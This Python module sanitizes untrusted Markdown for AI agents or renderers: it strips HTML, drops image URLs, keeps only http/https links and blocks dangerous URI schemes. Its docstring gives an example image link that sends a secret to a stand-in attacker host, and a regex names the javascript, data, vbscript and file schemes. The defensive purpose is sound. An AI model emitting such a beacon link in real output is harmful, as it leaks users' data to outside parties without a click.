"""Neutralize exfiltration and injection vectors in untrusted Markdown.

When Markdown is returned to an agent or rendered, its most dangerous
feature is auto-rendered images and links: an image such as
`![x](http://attacker/?secret=...)` beacons data out with zero clicks, and
dangerous-scheme links (`javascript:`, `data:`, `file:`) run code or read
local files on one click. Raw embedded HTML reintroduces both. This module
applies a conservative, linear-time transform that strips HTML, defangs
images by dropping their URLs, keeps only http/https links, and neutralizes
dangerous-scheme URIs. It is a hardening transform, not a full renderer.
"""

import re

# All patterns are bounded and use negated character classes, so they run
# in linear time and cannot be turned into a ReDoS.
_HTML_TAG = re.compile(r"<[^>\n]{0,2000}>")
_IMAGE = re.compile(r"!\[([^\]\n]{0,500})\]\([^)\n]{0,2000}\)")
_LINK = re.compile(r"\[([^\]\n]{0,500})\]\(([^)\s]{0,2000})\)")
_DANGEROUS_SCHEME = re.compile(r"(?i)(javascript|data|vbscript|file):(?=\S)")

ALLOWED_LINK_SCHEMES = frozenset({"http", "https"})


def sanitize_markdown(text: str) -> str:
    """Return Markdown with HTML stripped and exfiltration vectors removed."""
    text = _HTML_TAG.sub("", text)
    text = _IMAGE.sub(lambda m: f"[image removed: {m.group(1)}]", text)
    text = _LINK.sub(_sanitize_link, text)
    text = _DANGEROUS_SCHEME.sub(lambda m: m.group(1) + "-scheme-blocked:", text)
    return text


def _sanitize_link(match: re.Match) -> str:
    label = match.group(1)
    url = match.group(2).strip()
    scheme = url.split(":", 1)[0].lower() if ":" in url else ""
    # A relative link has no scheme and is safe; an http/https link is kept
    # but a caller can still see it. Any other scheme drops to plain text.
    if scheme and scheme not in ALLOWED_LINK_SCHEMES:
        return f"[{label}]"
    return f"[{label}]({url})"
